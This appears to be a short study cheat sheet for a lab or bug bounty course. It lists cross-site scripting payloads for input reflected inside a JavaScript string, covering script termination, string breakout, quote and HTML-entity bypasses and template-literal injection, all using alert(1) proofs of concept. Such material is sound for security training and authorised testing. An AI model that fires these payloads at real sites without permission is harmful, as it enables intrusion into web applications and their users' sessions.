# JavaScript Context Payloads

## Context

Input reflected inside:

```javascript
<script>

var input = 'USER_INPUT';

</script>
```

---

# Script Termination

```html
</script><script>alert(1)</script>
```

---

# String Breakout

```javascript
';alert(1)//
```

---

```javascript
'-alert(1)-'
```

---

# Escaped Quote Bypass

```javascript
\';alert(1)//
```

---

# HTML Entity Bypass

```html
&apos;-alert(1)-&apos;
```

---

# Template Literal

```javascript
${alert(1)}
```

---

# Related Labs

```text
Lab18
Lab19
Lab20
Lab22
Lab23
```

---

# Bug Bounty Reminder

Always identify:

```text
String?
Script?
Template Literal?
Event Handler?
```

before selecting payload.